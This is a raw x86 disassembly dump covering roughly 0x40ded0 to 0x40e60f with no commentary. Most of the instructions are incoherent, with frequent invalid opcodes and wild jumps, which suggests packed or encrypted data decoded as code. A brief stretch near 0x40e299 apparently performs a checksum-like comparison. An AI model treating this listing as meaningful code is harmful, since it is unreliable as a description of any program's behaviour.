  40ded0:	shl    BYTE PTR [ebx-0xcdd49fa],cl
  40ded6:	fcmovb st,st(1)
  40ded8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded9:	jnp    0x40de99
  40dedb:	(bad)  
  40dedc:	sti    
  40dedd:	test   BYTE PTR [edi+edi*1-0x5aebcd0d],bh
  40dee4:	xchg   esi,eax
  40dee5:	adc    eax,0x5c648738
  40deea:	push   edi
  40deeb:	je     0x40dea7
  40deed:	push   ss
  40deee:	sbb    ebp,DWORD PTR [edx-0x17fe6e1c]
  40def4:	ds mov edi,0xc1c4094d
  40defa:	aad    0x8e
  40defc:	dec    edx
  40defd:	or     BYTE PTR [edi+edi*4],dh
  40df00:	jo     0x40deee
  40df02:	and    esi,esi
  40df04:	sub    ecx,DWORD PTR [edx]
  40df06:	popf   
  40df07:	and    edi,ecx
  40df09:	lock into 
  40df0b:	mov    ebx,0x4bfb75c4
  40df10:	aaa    
  40df11:	xor    BYTE PTR [ecx+0x470fa403],ch
  40df17:	cmp    BYTE PTR [ebx],dh
  40df19:	xor    BYTE PTR [edi-0x67],ah
  40df1c:	nop
  40df1d:	ins    BYTE PTR es:[edi],dx
  40df1e:	(bad)  
  40df1f:	std    
  40df20:	add    al,0x8f
  40df22:	and    edx,edx
  40df24:	pop    edx
  40df25:	push   esp
  40df26:	leave  
  40df27:	or     al,0xf8
  40df29:	loopne 0x40dec4
  40df2b:	mov    al,ds:0x1c6ed4cc
  40df30:	imul   edi,DWORD PTR [ebp+0x32],0x87a71d6f
  40df37:	pop    es
  40df38:	gs xchg ah,bl
  40df3b:	enter  0x73ea,0x66
  40df3f:	out    0xa7,al
  40df41:	out    0x1f,eax
  40df43:	pop    eax
  40df44:	pushf  
  40df45:	leave  
  40df46:	xor    eax,0x880668a3
  40df4b:	mov    ah,0xfd
  40df4d:	jnp    0x40df96
  40df4f:	loope  0x40df89
  40df51:	data16 ins BYTE PTR es:[edi],dx
  40df53:	add    BYTE PTR [esi+0x5a58b265],0xb9
  40df5a:	dec    esi
  40df5b:	pop    eax
  40df5c:	out    0xc5,eax
  40df5e:	cs retf 0xf204
  40df62:	mov    ebp,0xe245880b
  40df67:	lock cwde 
  40df69:	pop    ecx
  40df6a:	cwde   
  40df6b:	pop    es
  40df6c:	dec    ebx
  40df6d:	pop    eax
  40df6e:	mov    ebp,0x4052f03b
  40df74:	popf   
  40df75:	test   eax,0xa4dfb24a
  40df7a:	push   es
  40df7b:	(bad)  
  40df7c:	push   cs
  40df7d:	leave  
  40df7e:	lods   al,BYTE PTR gs:[esi]
  40df80:	cwde   
  40df81:	cdq    
  40df82:	cmp    esi,esi
  40df84:	aaa    
  40df85:	mov    dl,0xd9
  40df87:	inc    ecx
  40df88:	jecxz  0x40df78
  40df8a:	mov    ss,WORD PTR [edi+0x20]
  40df8d:	jbe    0x40dff3
  40df8f:	cmp    al,0xe2
  40df91:	scas   eax,DWORD PTR es:[edi]
  40df92:	sti    
  40df93:	mov    DWORD PTR [ebx-0x63549e24],eax
  40df99:	xor    edi,DWORD PTR [edx+0x22]
  40df9c:	mov    dl,BYTE PTR [esi-0x7d]
  40df9f:	ins    BYTE PTR es:[edi],dx
  40dfa0:	arpl   WORD PTR [ecx],cx
  40dfa2:	in     al,dx
  40dfa3:	(bad)  
  40dfa4:	xchg   ebx,eax
  40dfa5:	push   0x47cddd21
  40dfaa:	push   eax
  40dfab:	sub    al,0xb5
  40dfad:	lea    edi,[edi]
  40dfaf:	loopne 0x40df93
  40dfb1:	inc    edi
  40dfb2:	lds    edi,FWORD PTR [edi+0x22eddcd]
  40dfb8:	add    eax,0x105ecaf0
  40dfbd:	and    DWORD PTR [ecx],0xab87140e
  40dfc3:	jle    0x40df67
  40dfc5:	adc    ecx,DWORD PTR [esi-0x70c423ad]
  40dfcb:	inc    ebx
  40dfcc:	cmp    eax,0x36
  40dfcf:	jnp    0x40df84
  40dfd1:	or     DWORD PTR [ebx-0x5d],ebp
  40dfd4:	aas    
  40dfd5:	mov    dh,0x9f
  40dfd7:	adc    al,BYTE PTR [ebx+esi*4+0x3e8f56a7]
  40dfde:	mov    ah,0x6b
  40dfe0:	push   eax
  40dfe1:	mov    ds:0xa4bacacf,eax
  40dfe6:	sub    al,0x93
  40dfe8:	xor    dh,dl
  40dfea:	aad    0xce
  40dfec:	mov    eax,0xb7d86794
  40dff1:	aas    
  40dff2:	add    DWORD PTR [ecx-0x2f58d44c],ebx
  40dff8:	hlt    
  40dff9:	or     eax,0xe168471e
  40dffe:	or     ebx,0xffffffb1
  40e001:	(bad)  
  40e003:	xchg   esi,eax
  40e004:	cmp    eax,0x2daa8c4c
  40e009:	push   ss
  40e00a:	test   DWORD PTR [esi+0x3bd78b03],edx
  40e010:	push   ds
  40e011:	xor    dl,BYTE PTR [esi]
  40e013:	push   ds
  40e014:	dec    eax
  40e015:	daa    
  40e016:	(bad)  
  40e017:	pop    es
  40e018:	mov    ds:0x5635cbba,al
  40e01d:	mov    edi,0x9a99bcfd
  40e022:	push   0x78fea5a
  40e027:	xor    eax,0xdfc15e1a
  40e02c:	inc    edi
  40e02d:	out    0x13,eax
  40e02f:	and    DWORD PTR [ebx+0x6d],ebp
  40e032:	cwde   
  40e033:	pushf  
  40e034:	push   ss
  40e035:	pop    ebx
  40e036:	std    
  40e037:	dec    esi
  40e038:	adc    BYTE PTR [eax+0x57],0xe3
  40e03c:	jno    0x40e05b
  40e03e:	sub    BYTE PTR [ebp+0x71],dh
  40e041:	inc    edi
  40e042:	shr    edi,0x95
  40e045:	fwait
  40e046:	xchg   edx,eax
  40e047:	not    DWORD PTR [ebx]
  40e049:	not    edi
  40e04b:	imul   edx,DWORD PTR [ebx+esi*4],0x7b
  40e04f:	inc    ebp
  40e050:	or     dl,al
  40e052:	sti    
  40e053:	es loope 0x40e078
  40e056:	or     BYTE PTR [ebx],0x7f
  40e059:	inc    esp
  40e05a:	dec    ebx
  40e05b:	sbb    eax,edx
  40e05d:	add    edx,ebp
  40e05f:	cmp    dl,BYTE PTR [edx-0x16432508]
  40e065:	stos   BYTE PTR es:[edi],al
  40e066:	mov    cl,0x4c
  40e068:	adc    BYTE PTR [ebx],0x48
  40e06b:	mov    esp,0x46541e60
  40e070:	ret    0xb377
  40e073:	add    BYTE PTR [esi+0x77],ch
  40e076:	fst    QWORD PTR [edi+0x601a70dc]
  40e07c:	and    ch,cl
  40e07e:	ins    BYTE PTR es:[edi],dx
  40e07f:	stos   BYTE PTR es:[edi],al
  40e080:	pop    eax
  40e081:	dec    eax
  40e082:	mov    cl,0xe4
  40e084:	adc    ah,al
  40e086:	or     ebx,eax
  40e088:	iret   
  40e089:	xor    ah,cl
  40e08b:	dec    esi
  40e08c:	and    al,0x22
  40e08f:	test   eax,0xb997b457
  40e094:	sar    ch,cl
  40e096:	cld    
  40e097:	dec    ecx
  40e098:	ds lahf 
  40e09a:	push   ebx
  40e09b:	sub    al,0x40
  40e09d:	fucomp st(3)
  40e09f:	xor    ah,BYTE PTR [edi-0x16]
  40e0a2:	fcmovnbe st,st(4)
  40e0a4:	aas    
  40e0a5:	idiv   BYTE PTR [edi-0x6882a6d8]
  40e0ab:	mov    ebx,0xa79621a5
  40e0b0:	push   ebp
  40e0b1:	jb     0x40e09b
  40e0b3:	neg    eax
  40e0b5:	repz icebp 
  40e0b7:	fnstcw WORD PTR [esi]
  40e0b9:	lods   al,BYTE PTR ds:[esi]
  40e0ba:	jle    0x40e093
  40e0bc:	pop    ebp
  40e0bd:	sahf   
  40e0be:	add    eax,0x1f71d58b
  40e0c3:	sub    BYTE PTR [edx-0x6af87e38],dh
  40e0c9:	outs   dx,BYTE PTR ds:[esi]
  40e0ca:	mov    DWORD PTR ds:[edi+0x12],esi
  40e0ce:	ror    DWORD PTR [ebp-0x7e3f5c1b],0xc3
  40e0d5:	cwde   
  40e0d6:	push   ecx
  40e0d7:	fmul   DWORD PTR [eax+0x61]
  40e0da:	aam    0x8
  40e0dc:	sub    BYTE PTR [edx-0x27],cl
  40e0df:	xchg   ecx,eax
  40e0e0:	or     al,0x20
  40e0e2:	cdq    
  40e0e3:	mov    ?,esi
  40e0e5:	mov    bl,BYTE PTR [ecx]
  40e0e7:	mov    bh,0x80
  40e0e9:	and    BYTE PTR [edx],ah
  40e0eb:	mov    edi,0x6c5173f4
  40e0f0:	je     0x40e0d1
  40e0f2:	sub    eax,0xf8a7f83b
  40e0f7:	gs xchg ebp,eax
  40e0f9:	bound  ecx,QWORD PTR [eax]
  40e0fb:	jecxz  0x40e13a
  40e0fd:	or     BYTE PTR [esi-0x7ac3079e],ch
  40e103:	push   esp
  40e104:	inc    edi
  40e105:	lds    ebp,FWORD PTR [bp+si+0x3208]
  40e10a:	sub    dl,BYTE PTR [esi]
  40e10c:	nop
  40e10d:	sahf   
  40e10e:	adc    BYTE PTR [ebx-0x3b8944dc],cl
  40e114:	pop    edi
  40e115:	stc    
  40e116:	xor    ah,BYTE PTR [ebp+0x8]
  40e119:	bnd jb 0x40e0aa
  40e11c:	jp     0x40e14e
  40e11e:	scas   eax,DWORD PTR es:[edi]
  40e11f:	push   ss
  40e120:	inc    edi
  40e121:	dec    edx
  40e122:	into   
  40e123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e124:	pop    ecx
  40e125:	and    edi,esp
  40e127:	sbb    DWORD PTR [ebp+0x25752587],ecx
  40e12d:	push   0x39
  40e12f:	mov    dh,0xd2
  40e131:	xchg   ebp,eax
  40e132:	adc    edx,DWORD PTR [edx+0x74]
  40e135:	jg     0x40e106
  40e137:	inc    edi
  40e138:	fwait
  40e139:	mov    al,0x58
  40e13b:	outs   dx,DWORD PTR ds:[si]
  40e13d:	and    eax,0x2d0a7d72
  40e142:	inc    ebp
  40e143:	or     al,0x57
  40e145:	cmp    cl,bl
  40e147:	mov    ch,0xbb
  40e149:	add    dl,ch
  40e14b:	mov    al,0x56
  40e14d:	jge    0x40e19d
  40e14f:	jle    0x40e13f
  40e151:	dec    ebx
  40e152:	out    dx,al
  40e153:	mov    cl,0xeb
  40e155:	retf   
  40e156:	or     edx,DWORD PTR [ecx+0x40]
  40e159:	xor    eax,edx
  40e15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e15c:	sbb    ebx,edx
  40e15e:	jae    0x40e1b6
  40e160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e161:	dec    eax
  40e162:	call   FWORD PTR [edi]
  40e164:	xor    eax,eax
  40e166:	stos   DWORD PTR es:[edi],eax
  40e167:	push   eax
  40e168:	sbb    BYTE PTR [esp+edx*1+0x3e],bl
  40e16c:	fldenv [ebx-0x5c8dc443]
  40e172:	int    0x22
  40e174:	adc    dl,0xfe
  40e177:	jo     0x40e19b
  40e179:	das    
  40e17a:	pop    esi
  40e17b:	sbb    BYTE PTR [eax+ecx*4+0x113fb222],0x5c
  40e183:	lds    eax,FWORD PTR [ebx+0x271bbd77]
  40e189:	jno    0x40e112
  40e18b:	into   
  40e18c:	rcr    DWORD PTR [ecx-0x2cf68cef],cl
  40e192:	jmp    0x2380:0x52eeb988
  40e199:	mov    dh,0x63
  40e19b:	test   DWORD PTR [ebx],ebx
  40e19d:	aam    0xc3
  40e19f:	add    BYTE PTR [eax+0x6b],ch
  40e1a2:	sbb    BYTE PTR [edi],dl
  40e1a4:	jmp    0x40e166
  40e1a6:	mov    ebp,0x9afa6275
  40e1ab:	sti    
  40e1ac:	jmp    0x435a466b
  40e1b1:	fs ror dh,cl
  40e1b4:	ret    
  40e1b5:	push   es
  40e1b6:	dec    edi
  40e1b7:	mov    dh,0xe1
  40e1b9:	ret    
  40e1ba:	jne    0x40e210
  40e1bc:	pop    ecx
  40e1bd:	div    BYTE PTR [ebx+0x2a]
  40e1c0:	mov    cl,0xfd
  40e1c2:	push   ds
  40e1c3:	ins    DWORD PTR es:[edi],dx
  40e1c4:	push   esi
  40e1c5:	cdq    
  40e1c6:	xchg   ebp,eax
  40e1c7:	cld    
  40e1c8:	jnp    0x40e225
  40e1ca:	jbe    0x40e1e7
  40e1cc:	lds    ebp,FWORD PTR [ebp-0x3de27691]
  40e1d2:	sub    edi,ebp
  40e1d4:	pop    ss
  40e1d5:	iret   
  40e1d6:	adc    DWORD PTR [edx+0x44],esp
  40e1d9:	lea    ecx,[edx-0x3832a74d]
  40e1df:	sub    al,0x9e
  40e1e1:	test   DWORD PTR [esi],edi
  40e1e3:	push   ecx
  40e1e4:	lods   eax,DWORD PTR ds:[esi]
  40e1e5:	push   edx
  40e1e6:	gs mov edi,0x9db3f8dc
  40e1ec:	xchg   ecx,eax
  40e1ed:	gs and al,0xae
  40e1f0:	push   ebp
  40e1f1:	ror    DWORD PTR [ecx+0x76cf8d0],0x8c
  40e1f8:	bound  ecx,QWORD PTR [esp+eiz*4-0x30]
  40e1fc:	call   0x70d5:0x6c848a65
  40e203:	(bad)  
  40e204:	mov    eax,0xd8f2b28c
  40e209:	jecxz  0x40e1ec
  40e20b:	adc    edi,ecx
  40e20d:	test   al,0xe9
  40e20f:	(bad)  
  40e210:	(bad)  
  40e211:	neg    DWORD PTR ds:0x2b7bab2d
  40e217:	cmp    bl,cl
  40e219:	or     bl,BYTE PTR [ecx]
  40e21b:	test   DWORD PTR [edx+0x65d3002b],0xbbdccdc6
  40e225:	cmp    BYTE PTR [ebp+0x30a54522],ah
  40e22b:	outs   dx,BYTE PTR ds:[esi]
  40e22c:	inc    edx
  40e22d:	mov    dh,0xf8
  40e22f:	xor    edi,DWORD PTR [ebx]
  40e231:	shl    dl,cl
  40e233:	mov    ds:0xe7f7f80,al
  40e238:	in     eax,0x78
  40e23a:	push   0x5e789463
  40e23f:	shr    DWORD PTR [ebx-0x2c9c91f3],1
  40e245:	arpl   WORD PTR [ebp+esi*1-0x482f571e],ax
  40e24c:	push   cs
  40e24d:	sub    ecx,DWORD PTR [ebx-0x59]
  40e250:	xchg   DWORD PTR [esp+eax*4+0x68],esp
  40e254:	hlt    
  40e255:	mov    edx,DWORD PTR [edi+0x1362fc63]
  40e25b:	push   cs
  40e25c:	or     DWORD PTR [ecx-0x50f3db4f],ecx
  40e262:	or     DWORD PTR [ebp-0x1ea82459],edx
  40e268:	inc    cl
  40e26a:	and    eax,DWORD PTR [edx-0x48872393]
  40e270:	in     eax,dx
  40e271:	pop    edx
  40e272:	lock dec esi
  40e274:	lea    esp,[eax+0x20]
  40e277:	inc    ebp
  40e278:	add    eax,0x4ea73db9
  40e27d:	mov    bh,0xf8
  40e27f:	dec    edx
  40e280:	inc    eax
  40e281:	xor    al,0x7f
  40e283:	push   es
  40e284:	arpl   WORD PTR [esi+esi*1],sp
  40e287:	and    ch,BYTE PTR [edi]
  40e289:	fcmovb st,st(7)
  40e28b:	dec    ecx
  40e28c:	mov    edi,0xc95d20da
  40e291:	ss loope 0x40e2c0
  40e294:	jp     0x40e2d1
  40e296:	mov    bh,0x2b
  40e298:	cli    
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x5e5ddc
  40e2c4:	jg     0x40e32c
  40e2c6:	mov    esi,0x7e7eaa2e
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	nop
  40e2d0:	aas    
  40e2d1:	loope  0x40e348
  40e2d3:	adc    edi,DWORD PTR [ecx-0x39]
  40e2d6:	dec    ebx
  40e2d7:	sub    al,0xb0
  40e2da:	sbb    esi,edi
  40e2dc:	dec    ebp
  40e2dd:	xchg   ecx,eax
  40e2de:	cdq    
  40e2df:	(bad)  
  40e2e0:	sbb    BYTE PTR [eax],cl
  40e2e2:	neg    BYTE PTR [esi-0x3a4e0d24]
  40e2e8:	dec    ebp
  40e2e9:	out    dx,al
  40e2ea:	adc    al,0x8f
  40e2ec:	aaa    
  40e2ed:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ef:	or     bh,bh
  40e2f1:	js     0x40e315
  40e2f3:	std    
  40e2f4:	xor    DWORD PTR fs:[esi-0x1e63718],esp
  40e2fb:	mov    al,ds:0x966927b
  40e300:	scas   al,BYTE PTR es:[edi]
  40e301:	or     ch,al
  40e303:	push   edx
  40e304:	call   0xdcef:0x5864c0b6
  40e30b:	or     DWORD PTR [ebx],edi
  40e30d:	in     eax,0x8e
  40e30f:	fst    QWORD PTR ds:0xab1e1ace
  40e315:	sbb    esi,DWORD PTR [ebp-0xebb63bf]
  40e31b:	in     al,dx
  40e31c:	ror    BYTE PTR [ebx-0x20],0xd0
  40e320:	imul   edi,DWORD PTR [esp+edx*1+0x1b],0xffffff92
  40e325:	rol    BYTE PTR [edi+ebp*4],1
  40e328:	arpl   WORD PTR [ecx+0x46],ax
  40e32b:	mov    ebx,0x99d579b7
  40e330:	inc    ebp
  40e331:	stos   BYTE PTR es:[edi],al
  40e332:	sub    BYTE PTR [edi-0x6f774d4f],bh
  40e338:	xlat   BYTE PTR ds:[ebx]
  40e339:	push   esp
  40e33a:	push   esi
  40e33b:	pusha  
  40e33c:	(bad)  
  40e33d:	nop
  40e33e:	ror    bl,1
  40e340:	mov    bh,0x66
  40e342:	arpl   bp,si
  40e344:	sbb    al,0x71
  40e346:	pop    ebp
  40e347:	fcmovu st,st(2)
  40e349:	pushf  
  40e34a:	mov    edx,0xd57efc58
  40e34f:	nop
  40e350:	jp     0x40e3a5
  40e352:	arpl   WORD PTR [edi-0x439c474a],ax
  40e358:	adc    DWORD PTR [ecx],eax
  40e35a:	scas   eax,DWORD PTR es:[edi]
  40e35b:	lods   eax,DWORD PTR ds:[esi]
  40e35c:	mov    ds:0xd34767a0,eax
  40e361:	cmp    esi,DWORD PTR [edi-0x695f97c1]
  40e367:	jne    0x40e3e8
  40e369:	push   esi
  40e36a:	sti    
  40e36b:	in     al,dx
  40e36c:	fsub   st(0),st
  40e36e:	clc    
  40e36f:	add    BYTE PTR [esi],al
  40e371:	push   cs
  40e372:	cmc    
  40e373:	clc    
  40e374:	popf   
  40e375:	lock sbb esi,ecx
  40e378:	repz mov dl,0xa4
  40e37b:	mov    gs,WORD PTR ds:0x6ff17046
  40e381:	out    dx,eax
  40e382:	mov    eax,0xf5599fd4
  40e387:	mov    dl,0xa1
  40e389:	rol    DWORD PTR [ebx-0x9],0xc6
  40e38d:	xchg   esp,eax
  40e38e:	sbb    ebx,DWORD PTR [ecx+0x1b]
  40e391:	popa   
  40e392:	out    0x3a,eax
  40e394:	scas   al,BYTE PTR es:[edi]
  40e395:	and    edi,DWORD PTR ds:0xff66b142
  40e39b:	xor    ecx,esp
  40e39d:	inc    edi
  40e39e:	pop    edx
  40e39f:	dec    ebp
  40e3a0:	hlt    
  40e3a1:	mov    cl,0xaa
  40e3a3:	dec    esp
  40e3a4:	cmp    DWORD PTR [edx+0x7872b5a7],edx
  40e3aa:	sub    al,0xe5
  40e3ac:	test   al,0xbf
  40e3ae:	dec    esi
  40e3af:	xor    al,0x14
  40e3b1:	in     al,0xae
  40e3b3:	ins    BYTE PTR es:[edi],dx
  40e3b4:	outs   dx,BYTE PTR ds:[esi]
  40e3b5:	aas    
  40e3b6:	push   0x39e79224
  40e3bb:	xor    eax,0x4b35c3eb
  40e3c0:	xchg   esi,esi
  40e3c2:	cmp    DWORD PTR [edi-0x1e],ebx
  40e3c5:	and    DWORD PTR ds:0xaeac31f2,edx
  40e3cb:	add    al,0xb2
  40e3cd:	push   ebp
  40e3ce:	jo     0x40e35c
  40e3d0:	inc    ebx
  40e3d1:	push   eax
  40e3d2:	pusha  
  40e3d3:	mov    cl,0x9a
  40e3d5:	xchg   BYTE PTR [edi-0x22],dl
  40e3d8:	xchg   ecx,eax
  40e3d9:	dec    edi
  40e3da:	je     0x40e3e5
  40e3dc:	sub    BYTE PTR [ecx+0x66ab1338],cl
  40e3e2:	pop    esp
  40e3e3:	xchg   esp,eax
  40e3e4:	rcl    ah,1
  40e3e6:	mov    DWORD PTR [eax],esi
  40e3e8:	cs iret 
  40e3ea:	push   0xa1936a13
  40e3ef:	cs leave 
  40e3f1:	push   cs
  40e3f2:	inc    ecx
  40e3f3:	sub    ebp,edx
  40e3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3f7:	ret    0x9805
  40e3fa:	add    eax,0x97f745cd
  40e3ff:	bound  esp,QWORD PTR [edi-0x5]
  40e402:	loopne 0x40e46d
  40e404:	xor    cl,BYTE PTR ds:0x9820e01
  40e40a:	add    eax,0xc3160651
  40e40f:	push   eax
  40e410:	sbb    DWORD PTR [eax+0x3e],ecx
  40e413:	add    eax,0xe6e8cf96
  40e418:	hlt    
  40e419:	clc    
  40e41a:	pop    ecx
  40e41b:	iret   
  40e41c:	scas   eax,DWORD PTR es:[edi]
  40e41d:	cmp    BYTE PTR [edx-0x6037c9b4],bl
  40e423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e424:	hlt    
  40e425:	stos   BYTE PTR es:[edi],al
  40e426:	int3   
  40e427:	or     ch,ch
  40e429:	xchg   edx,eax
  40e42a:	repz fmul DWORD PTR [edx-0x7b4aa62f]
  40e431:	fadd   QWORD PTR [edx-0x54]
  40e434:	adc    eax,0xe2107662
  40e439:	cmc    
  40e43a:	sub    bl,dh
  40e43c:	xor    ebx,DWORD PTR [ebx]
  40e43e:	sbb    al,BYTE PTR [edi-0x77]
  40e441:	das    
  40e442:	fxch   st(0)
  40e444:	stos   BYTE PTR es:[edi],al
  40e445:	push   ebp
  40e446:	add    ecx,DWORD PTR [ebx]
  40e448:	xchg   edi,eax
  40e449:	push   esp
  40e44a:	sahf   
  40e44b:	ret    
  40e44c:	push   0x3e
  40e44e:	out    dx,al
  40e44f:	ret    
  40e450:	sub    DWORD PTR [esi+0x75df66b7],esi
  40e456:	sub    al,0x51
  40e458:	loopne 0x40e3db
  40e45a:	pop    esp
  40e45b:	mov    al,BYTE PTR [ebp+0xf37658f]
  40e461:	ret    
  40e462:	add    al,0xf9
  40e464:	jbe    0x40e481
  40e466:	dec    esi
  40e467:	bound  eax,QWORD PTR [ebx]
  40e469:	lahf   
  40e46a:	dec    ebx
  40e46b:	jle    0x40e431
  40e46d:	pop    ss
  40e46e:	clc    
  40e46f:	inc    ebp
  40e470:	in     eax,0x54
  40e472:	dec    esp
  40e473:	jecxz  0x40e4bb
  40e475:	cli    
  40e476:	imul   edx,DWORD PTR [edx],0xfcb76ecf
  40e47c:	dec    ebx
  40e47d:	icebp  
  40e47e:	xchg   esp,eax
  40e47f:	fcomp  QWORD PTR [edx-0x80]
  40e482:	adc    esp,DWORD PTR [esi]
  40e484:	push   edi
  40e485:	mov    bl,0x34
  40e487:	outs   dx,DWORD PTR ds:[esi]
  40e488:	xchg   ecx,eax
  40e489:	jo     0x40e4f0
  40e48b:	push   ecx
  40e48c:	jg     0x40e4a7
  40e48e:	xor    dl,BYTE PTR [esi+0x2be9ba8c]
  40e494:	mov    al,dh
  40e496:	push   0xffffffa8
  40e498:	mov    BYTE PTR [edx-0x42b29ad7],dl
  40e49e:	icebp  
  40e49f:	dec    ecx
  40e4a0:	inc    edi
  40e4a1:	pushf  
  40e4a2:	mov    bh,0x68
  40e4a4:	sub    DWORD PTR [esi+0x4],edi
  40e4a7:	(bad)  [eax]
  40e4a9:	xor    BYTE PTR [edi],0x72
  40e4ac:	aaa    
  40e4ad:	sti    
  40e4ae:	ss cld 
  40e4b0:	in     eax,dx
  40e4b1:	xor    BYTE PTR [ecx-0x5fd47acf],dl
  40e4b7:	leave  
  40e4b8:	mov    ah,0x3
  40e4ba:	push   edx
  40e4bb:	outs   dx,BYTE PTR ds:[esi]
  40e4bc:	or     DWORD PTR [ecx],0xffffffca
  40e4bf:	mov    al,0x16
  40e4c1:	lock in eax,0x44
  40e4c4:	scas   al,BYTE PTR es:[edi]
  40e4c5:	in     al,0xf1
  40e4c7:	sbb    al,0x56
  40e4c9:	jns    0x40e4cc
  40e4cb:	fcom   QWORD PTR [edi+0x6b]
  40e4ce:	retf   0x36e9
  40e4d1:	and    DWORD PTR [edx-0x31fbc43f],edx
  40e4d7:	jo     0x40e542
  40e4d9:	es js  0x40e49f
  40e4dc:	xor    al,0xf0
  40e4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4df:	add    al,0x2a
  40e4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4e2:	mov    ecx,0xc0b51b79
  40e4e7:	leave  
  40e4e8:	cmp    WORD PTR [esi+ebp*4-0xd],cx
  40e4ed:	cwde   
  40e4ee:	inc    eax
  40e4ef:	add    eax,0x243c8c0b
  40e4f4:	jmp    0x7dc32bf0
  40e4f9:	xchg   esp,eax
  40e4fa:	les    ecx,FWORD PTR [ecx+0x44]
  40e4fd:	xor    eax,0x3cfa7f33
  40e502:	adc    BYTE PTR [eax+0x53],0xf4
  40e506:	div    DWORD PTR [ecx]
  40e508:	sub    DWORD PTR [edx],edi
  40e50a:	mov    esi,0x9d9eb2f1
  40e50f:	cmp    al,0x58
  40e511:	stc    
  40e512:	outs   dx,DWORD PTR ds:[esi]
  40e513:	mov    WORD PTR [ecx],fs
  40e515:	mov    esp,0xfda52b6b
  40e51a:	out    dx,eax
  40e51b:	push   ebp
  40e51c:	mov    ecx,0xb25f59e
  40e521:	test   eax,0x132ee063
  40e526:	into   
  40e527:	std    
  40e528:	lods   al,BYTE PTR ds:[esi]
  40e529:	clc    
  40e52a:	adc    eax,0xa44af0d1
  40e52f:	sbb    bl,BYTE PTR [eax-0x465f4e26]
  40e535:	mov    ah,0x21
  40e537:	cli    
  40e538:	xor    bh,BYTE PTR [esi]
  40e53a:	jmp    0xafdc:0x9d6eb057
  40e541:	dec    esi
  40e542:	mov    dl,0x2d
  40e544:	push   0x5167e3c4
  40e549:	or     eax,0x2429a8c9
  40e54e:	mov    gs,ecx
  40e550:	rol    BYTE PTR [ebx],cl
  40e552:	mov    eax,0x87953955
  40e557:	cmp    DWORD PTR [eax],edx
  40e559:	mov    al,ds:0xbb25edf8
  40e55e:	ins    BYTE PTR es:[edi],dx
  40e55f:	popf   
  40e560:	loopne 0x40e537
  40e562:	cmp    BYTE PTR [eax],0x30
  40e565:	leave  
  40e566:	cli    
  40e567:	call   esi
  40e569:	out    dx,eax
  40e56a:	xor    al,0xbb
  40e56c:	pop    edx
  40e56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e56f:	imul   eax,eax,0x27
  40e572:	out    0xac,eax
  40e574:	inc    edi
  40e575:	ja     0x40e51a
  40e577:	push   0x94d9b945
  40e57c:	scas   eax,DWORD PTR es:[edi]
  40e57d:	adc    eax,0xeb7c26bf
  40e582:	loopne 0x40e55f
  40e584:	hlt    
  40e585:	inc    ebp
  40e586:	cmp    DWORD PTR [esi+eax*2],esp
  40e589:	adc    cl,BYTE PTR [esi-0x45]
  40e58c:	arpl   WORD PTR [ecx-0x1202fdca],bp
  40e592:	push   es
  40e593:	out    dx,eax
  40e594:	es std 
  40e596:	xchg   edi,edx
  40e598:	int3   
  40e599:	push   es
  40e59a:	enter  0x7da5,0xfc
  40e59e:	mov    edi,0x38467747
  40e5a3:	jg     0x40e571
  40e5a5:	in     eax,dx
  40e5a6:	jno    0x40e538
  40e5a8:	leave  
  40e5a9:	stos   DWORD PTR es:[edi],eax
  40e5aa:	pop    ebx
  40e5ab:	fadd   QWORD PTR [eax]
  40e5ad:	push   0xffffff80
  40e5af:	mov    ebp,0x31bdbc2e
  40e5b4:	cmp    ch,al
  40e5b6:	ja     0x40e587
  40e5b8:	pop    ds
  40e5b9:	mov    dh,0x59
  40e5bb:	add    DWORD PTR [ecx+ecx*2-0x221df1de],ecx
  40e5c2:	scas   eax,DWORD PTR es:[edi]
  40e5c3:	dec    ebx
  40e5c4:	lods   eax,DWORD PTR ds:[esi]
  40e5c5:	jge    0x40e5ab
  40e5c7:	sbb    esp,DWORD PTR [esi+edi*4]
  40e5ca:	xchg   edi,eax
  40e5cb:	mov    eax,ds:0x638fb2db
  40e5d0:	pop    ss
  40e5d1:	(bad)  [esi+0x3ad545a8]
  40e5d7:	ret    
  40e5d8:	outs   dx,BYTE PTR ds:[esi]
  40e5d9:	add    cl,bl
  40e5db:	in     al,0x61
  40e5dd:	in     eax,dx
  40e5de:	outs   dx,DWORD PTR ds:[esi]
  40e5df:	adc    edx,ebx
  40e5e1:	and    edx,DWORD PTR [ecx+0x60f535a9]
  40e5e7:	add    BYTE PTR [edx+0x3f182ae7],dh
  40e5ed:	pop    esp
  40e5ee:	push   0x35
  40e5f0:	inc    edi
  40e5f1:	pop    eax
  40e5f2:	xchg   DWORD PTR [ecx+0x29],ecx
  40e5f5:	(bad)  
  40e5f6:	and    cl,BYTE PTR [ebp+0x62c7fff8]
  40e5fc:	sbb    cl,0xb5
  40e5ff:	out    dx,al
  40e600:	sub    bh,BYTE PTR [eax+0x1b]
  40e603:	pop    edx
  40e604:	push   eax
  40e605:	pop    esi
  40e606:	and    BYTE PTR [ebx+0x43555b68],bh
  40e60c:	loopne 0x40e607
  40e60e:	(bad)  
  40e60f:	cmc    
